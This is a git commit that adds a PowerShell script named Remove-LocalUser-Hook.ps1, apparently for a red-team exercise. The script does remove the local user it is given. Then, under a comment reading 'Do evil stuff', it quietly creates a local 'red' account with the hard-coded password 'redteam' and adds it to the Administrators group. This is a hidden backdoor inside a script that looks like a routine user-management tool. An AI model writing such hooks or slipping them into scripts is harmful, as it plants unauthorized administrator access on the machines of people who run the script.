09415fe3ad861f160c3fc7e897ae3726766f7541
zriback <zacharyriback@gmail.com>
2024-04-02 20:32:55 -0400

    Iteration 1

---
+++ Remove-LocalUser-Hook.ps1
@@ -0,0 +1,15 @@
+# Get the user that should be disabled
+$username=$args[0]
+
+# Remove the user specified
+Microsoft.PowerShell.LocalAccounts\Remove-LocalUser -Name $username
+
+# Do evil stuff
+# Remove the red user if it exists
+if (Get-LocalUser -Name "red" -ErrorAction SilentlyContinue) { Microsoft.PowerShell.LocalAccounts\Remove-LocalUser -Name "red" } 
+
+# Create admin user
+$pass = ConvertTo-SecureString -AsPlainText -Force -String "redteam"
+New-LocalUser "red" -Password $pass | out-null
+Add-LocalGroupMember -Group Administrators -Member "red" | out-null
+
